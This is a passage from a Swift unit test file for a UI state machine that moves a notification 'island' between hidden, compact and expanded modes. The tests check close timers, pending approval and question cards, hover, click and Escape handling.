        #expect(m.closesAt == at(517))
    }

    // MARK: Timers

    @Test func expandedFallsBackToCompactThenHides() {
        var m = machine(.click)
        #expect(m.handle(.tick, now: at(14.9)) == nil)
        #expect(m.mode == .expanded)
        #expect(m.handle(.tick, now: at(15)) == IslandTransition(from: .expanded, to: .compact, escaped: false))
        #expect(m.closesAt == at(75))
        #expect(m.handle(.tick, now: at(74)) == nil)
        #expect(m.handle(.tick, now: at(75)) == IslandTransition(from: .compact, to: .hidden, escaped: false))
        #expect(m.mode == .hidden)
        #expect(m.closesAt == nil)
    }

    @Test func aLateTickClosesOnlyOneStep() {
        var m = machine(.click)
        m.handle(.tick, now: at(1000))
        #expect(m.mode == .compact)
        #expect(m.closesAt == at(1060))
    }

    @Test func tickOnAHiddenIslandDoesNothing() {
        var m = IslandMachine()
        #expect(m.handle(.tick, now: at(10)) == nil)
    }

    @Test func countdownShownBeforeClose() {
        // Every visible mode without a hold has a deadline, so the countdown can be shown before it closes.
        for open: [IslandInput] in [[.ordinaryEvent], [.click], [.hoverBegan, .hoverEnded], [.click, .tick]] {
            var m = IslandMachine()
            for input in open { m.handle(input, now: t0) }
            #expect(m.mode != .hidden)
            #expect(m.closesAt != nil)
        }
        #expect(machine(.hoverBegan).closesAt == nil)
        #expect(machine(.waitingCards([card])).closesAt == nil)
    }

    // MARK: Pending card

    @Test func aWaitingCardExpandsOnceWhenItArrives() {
        var m = machine(.ordinaryEvent)
        let t = m.handle(.waitingCards([card]), now: at(1))
        #expect(t == IslandTransition(from: .compact, to: .expanded, escaped: false))
        #expect(m.closesAt == nil)
        #expect(m.handle(.waitingCards([card]), now: at(2)) == nil)
        #expect(m.handle(.waitingCards([]), now: at(3)) == nil)
        #expect(m.handle(.waitingCards([]), now: at(4)) == nil)
        #expect(m.closesAt == at(18))
    }

    @Test func aWaitingCardExpandsAHiddenIsland() {
        var m = IslandMachine()
        #expect(m.handle(.waitingCards([card]), now: t0) == IslandTransition(from: .hidden, to: .expanded, escaped: false))
    }

    @Test func nothingClosesWhileACardIsPending() {
        var m = machine(.waitingCards([card]))
        #expect(m.handle(.tick, now: at(10_000)) == nil)
        m.handle(.interaction, now: at(10_001))
        m.handle(.hoverBegan, now: at(10_002))
        m.handle(.hoverEnded, now: at(10_003))
        #expect(m.mode == .expanded)
        #expect(m.closesAt == nil)
    }

    @Test func whenTheCardGoesTheCurrentModeStartsItsNormalTimer() {
        var expanded = machine(.waitingCards([card]))
        expanded.handle(.waitingCards([]), now: at(7))
        #expect(expanded.mode == .expanded)
        #expect(expanded.closesAt == at(22))

        var compact = machine(.waitingCards([card]), .escape)
        compact.handle(.waitingCards([]), now: at(7))
        #expect(compact.mode == .compact)
        #expect(compact.closesAt == at(67))
    }

    @Test func aCardGoingWhileThePointerIsOnTheIslandKeepsItOpen() {
        var m = machine(.waitingCards([card]), .hoverBegan)
        m.handle(.waitingCards([]), now: at(7))
        #expect(m.closesAt == nil)
        m.handle(.hoverEnded, now: at(8))
        #expect(m.closesAt == at(23))
    }

    // MARK: Escape

    @Test func escapeStepsDownAndReportsItself() {
        var m = machine(.click)
        #expect(m.handle(.escape, now: at(1)) == IslandTransition(from: .expanded, to: .compact, escaped: true))
        #expect(m.closesAt == at(61))
        #expect(m.handle(.escape, now: at(2)) == IslandTransition(from: .compact, to: .hidden, escaped: true))
        #expect(m.closesAt == nil)
        // Escape is reported even when nothing changes, so a shown question is still released.
        #expect(m.handle(.escape, now: at(3)) == IslandTransition(from: .hidden, to: .hidden, escaped: true))
    }

    @Test func escapeWorksWhilePendingButCompactIsHeld() {
        var m = machine(.waitingCards([card]))
        #expect(m.handle(.escape, now: at(1)) == IslandTransition(from: .expanded, to: .compact, escaped: true))
        #expect(m.closesAt == nil)
        #expect(m.handle(.tick, now: at(10_000)) == nil)
        #expect(m.handle(.escape, now: at(2)) == IslandTransition(from: .compact, to: .compact, escaped: true))
        #expect(m.mode == .compact)
        #expect(m.closesAt == nil)
    }

    @Test func theCardDoesNotReExpandUntilANewCard() {
        var m = machine(.waitingCards([card]), .escape)
        #expect(m.handle(.waitingCards([card]), now: at(5)) == nil)
        #expect(m.mode == .compact)
        m.handle(.waitingCards([]), now: at(6))
        let t = m.handle(.waitingCards([card]), now: at(7))
        #expect(t == IslandTransition(from: .compact, to: .expanded, escaped: false))
    }

    /// A question arriving behind an approval that was escaped still expands the island: it is a card not seen before.
    @Test func aNewQuestionBehindAnEscapedApprovalExpands() {
        var m = machine(.waitingCards([card]), .escape)
        #expect(m.mode == .compact)
        let t = m.handle(.waitingCards([card, question]), now: at(5))
        #expect(t == IslandTransition(from: .compact, to: .expanded, escaped: false))
        #expect(m.closesAt == nil)
        // The approval going leaves the question holding the island open.
        #expect(m.handle(.waitingCards([question]), now: at(6)) == nil)
        #expect(m.mode == .expanded)
        #expect(m.closesAt == nil)
    }

    /// The same waiting cards after Escape do not expand again, and neither does one of them going.
    @Test func theSameCardsAfterEscapeStayCompact() {
        var m = machine(.waitingCards([card, question]), .escape)
        #expect(m.handle(.waitingCards([card, question]), now: at(5)) == nil)
        #expect(m.handle(.waitingCards([question]), now: at(6)) == nil)
        #expect(m.mode == .compact)
        #expect(m.closesAt == nil)
    }

    @Test func clickReExpandsAfterEscapeEvenWhilePending() {
        var m = machine(.waitingCards([card]), .escape)
        #expect(m.handle(.click, now: at(1)) == IslandTransition(from: .compact, to: .expanded, escaped: false))
        #expect(m.closesAt == nil)
    }
}
